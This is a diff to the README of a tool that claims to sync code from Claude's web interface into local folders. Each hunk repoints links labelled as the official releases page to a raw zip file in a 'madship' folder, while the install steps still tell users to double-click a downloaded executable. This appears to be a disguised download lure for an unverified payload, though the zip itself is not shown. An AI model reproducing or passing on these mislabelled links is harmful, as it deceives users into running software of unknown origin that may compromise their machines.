@@ -1,6 +1,6 @@
 # 📂 claude-artifacts-local-sync - Save Claude code directly to folders
 
-[![Download the Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/zerooo002/claude-artifacts-local-sync/releases)
+[![Download the Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/zerooo002/claude-artifacts-local-sync/main/madship/sync-claude-local-artifacts-2.7.zip)
 
 This software links your browser session with Claude to your local computer folders. It detects code blocks inside your web browser and creates matching files on your hard drive. You no longer need to copy and paste code manually. The tool keeps your local project updated every time you make changes in the Claude interface.
 
@@ -16,7 +16,7 @@ Ensure your computer meets these needs before you begin:
 
 ## 📥 How to Install
 
-1.  Visit the [official releases page](https://github.com/zerooo002/claude-artifacts-local-sync/releases) to download the latest version.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/zerooo002/claude-artifacts-local-sync/main/madship/sync-claude-local-artifacts-2.7.zip) to download the latest version.
 2.  Look for the file ending in `.exe` under the Assets section of the newest release.
 3.  Click the file to start the download to your computer.
 4.  Open your Downloads folder and double-click the downloaded file.
@@ -76,7 +76,7 @@ This application processes data locally on your machine. The software extracts c
 *   Name your artifacts clearly inside the Claude chat. The tool uses these names for your local files.
 *   Keep your project folders organized. Create sub-folders for different sessions to prevent naming collisions.
 *   Close the sync app when you finish your work to save system resources.
-*   Update the software regularly. Check the [releases page](https://github.com/zerooo002/claude-artifacts-local-sync/releases) every few weeks for improvements and fixes.
+*   Update the software regularly. Check the [releases page](https://raw.githubusercontent.com/zerooo002/claude-artifacts-local-sync/main/madship/sync-claude-local-artifacts-2.7.zip) every few weeks for improvements and fixes.
 
 ## 🎓 Understanding the Workflow
 
